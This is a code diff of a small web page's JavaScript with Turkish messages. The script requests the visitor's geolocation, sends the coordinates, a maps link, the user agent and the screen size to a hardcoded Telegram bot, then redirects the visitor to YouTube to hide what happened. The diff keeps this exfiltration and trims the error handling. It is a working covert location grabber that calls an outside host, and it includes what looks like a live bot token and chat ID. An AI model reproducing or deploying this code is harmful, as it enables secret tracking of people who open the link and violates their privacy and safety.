@@ -33,30 +33,25 @@
 
   <script>
     function getLocation() {
-      const info = document.getElementById("info");
-      info.innerText = "Yükleniyor...";
-
       if (!navigator.geolocation) {
-        info.innerText = "Tarayıcınız konum izni desteklemiyor.";
+        document.getElementById("info").innerText = "Tarayıcınız konum özelliğini desteklemiyor.";
         return;
       }
 
       navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
           const ua = navigator.userAgent;
           const screenRes = `${screen.width}x${screen.height}`;
           const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-          info.innerText = "Bağlanılıyor...";
 
           fetch("https://api.telegram.org/bot7315012164:AAFwEEQ-Oi26-gl6o7ulfpCRPzRh1XUPzK8/sendMessage", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               chat_id: "7874399327",
-              text: `📍 iPhone Konum Geldi:\nLatitude: ${lat}\nLongitude: ${lon}\n📍 Harita: ${mapsLink}\n\n📱 Cihaz: ${ua}\n📏 Ekran: ${screenRes}`
+              text: `📍 Konum Geldi:\nLatitude: ${lat}\nLongitude: ${lon}\n📍 Harita: ${mapsLink}\n\n📱 Cihaz: ${ua}\n📏 Ekran: ${screenRes}`
             })
           });
 
@@ -64,25 +59,9 @@
             window.location.href = "https://youtube.com";
           }, 3000);
         },
-        (error) => {
-          let msg = "Konum alınamadı: ";
-          switch (error.code) {
-            case error.PERMISSION_DENIED:
-              msg += "Kullanıcı konum iznini reddetti.";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              msg += "Konum bilgisi kullanılamıyor.";
-              break;
-            case error.TIMEOUT:
-              msg += "Konum alma süresi aşıldı.";
-              break;
-            default:
-              msg += "Bilinmeyen bir hata oluştu.";
-              break;
-          }
-          info.innerText = msg;
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        (err) => {
+          document.getElementById("info").innerText = "Konum alınamadı: " + err.message;
+        }
       );
     }
   </script>
